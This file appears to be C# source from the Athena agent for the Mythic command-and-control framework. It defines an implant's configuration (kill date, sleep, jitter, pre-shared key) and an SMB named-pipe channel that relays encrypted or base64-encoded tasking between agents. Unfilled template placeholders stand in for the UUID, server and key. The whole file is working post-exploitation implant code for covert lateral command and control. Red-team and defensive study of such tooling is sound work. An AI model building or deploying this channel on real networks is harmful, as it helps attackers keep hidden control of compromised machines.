using Athena.Models.Mythic.Response;
using Athena.Utilities;
using Newtonsoft.Json;
using System;
using System.IO;
using System.IO.Pipes;
using System.Text;
using System.Threading.Tasks;

namespace Athena.Config
{
    public class MythicConfig
    {
        public SmbServer currentConfig { get; set; }
        public string uuid { get; set; }
        public DateTime killDate { get; set; }
        public int sleep { get; set; }
        public int jitter { get; set; }
        public SmbClient smbConfig { get; set; }

        public MythicConfig()
        {
            this.uuid = "%UUID%";
            this.killDate = DateTime.Parse("2022-08-25");
            int sleep = int.TryParse("0", out sleep) ? sleep : 60;
            this.sleep = sleep;
            int jitter = int.TryParse("0", out jitter) ? jitter : 10;
            this.jitter = jitter;
            this.currentConfig = new SmbServer(this.uuid, this);
            this.smbConfig = new SmbClient();
        }
    }

    public class SmbServer
    {
        public string psk { get; set; }
        public string callbackHost { get; set; }
        public string pipeName { get; set; }
        public bool encrypted { get; set; }
        public bool connected { get; set; }
        public bool encryptedExchangeCheck { get; set; }
        private MythicConfig baseConfig { get; set; }
        private NamedPipeServerStream pipeStream { get; set; }
        public PSKCrypto crypt { get; set; }

        public SmbServer(string uuid, MythicConfig config)
        {
            this.callbackHost = "%SERVER%";
            this.psk = "AESPSK";
            this.encryptedExchangeCheck = bool.Parse("encrypted_exchange_check");
            this.pipeName = "pipe_name";
            this.baseConfig = config;

            if (!string.IsNullOrEmpty(this.psk))
            {
                this.crypt = new PSKCrypto(uuid, this.psk);
                this.encrypted = true;
            }

            this.connected = Start(this.pipeName);

            if (!this.connected)
            {
                Environment.Exit(0);
            }
        }

        private bool Start(string name)
        {
            try
            {
                this.pipeStream = new NamedPipeServerStream(name);
                this.pipeStream.WaitForConnection();
                return true;
            }
            catch
            {
                return false;
            }
        }

        //Send, wait for a response, and return it to the main functions
        public async Task<string> Send(object obj)
        {
            if (!connected)
            {
                //Initiate a new connection
                this.Start(this.pipeName);
            }
            try
            {
                string json = JsonConvert.SerializeObject(obj);
                if (this.encrypted)
                {
                    json = this.crypt.Encrypt(json);
                }
                else
                {
                    json = Misc.Base64Encode(Globals.mc.MythicConfig.uuid + json);
                }

                //Send message to pipe and get response
                string res = this.SendToPipe(json);

                if (this.encrypted)
                {
                    return this.crypt.Decrypt(res);
                }
                else
                {
                    return Misc.Base64Decode(res).Substring(36);
                }
            }
            catch
            {
                return "";
            }
        }
        private string SendToPipe(string json)
        {
            try
            {
                // Read user input and send that to the client process.
                using (BinaryWriter _bw = new BinaryWriter(pipeStream))
                using (BinaryReader _br = new BinaryReader(pipeStream))
                {
                    //Format the message
                    DelegateMessage msg = new DelegateMessage()
                    {
                        uuid = this.baseConfig.uuid,
                        message = json,
                        c2_profile = "smbclient"
                    };

                    //Write to NamedPipe
                    var buf = Encoding.ASCII.GetBytes(JsonConvert.SerializeObject(msg));
                    _bw.Write((uint)buf.Length);
                    _bw.Write(buf);

                    //Wait for response from server
                    buf = ReceiveFromNamedPipe();

                    //Return the buffer as a string
                    return Encoding.ASCII.GetString(buf);
                }
            }
            catch
            {
                return "";
            }
        }
        //Read from named pipe and return it as a byte array
        private byte[] ReceiveFromNamedPipe()
        {
            byte[] buffer = new byte[1024];
            using (var ms = new MemoryStream())
            {
                do
                {
                    var readBytes = this.pipeStream.Read(buffer, 0, buffer.Length);
                    ms.Write(buffer, 0, readBytes);
                }
                while (!this.pipeStream.IsMessageComplete);

                return ms.ToArray();
            }
        }
    }
}
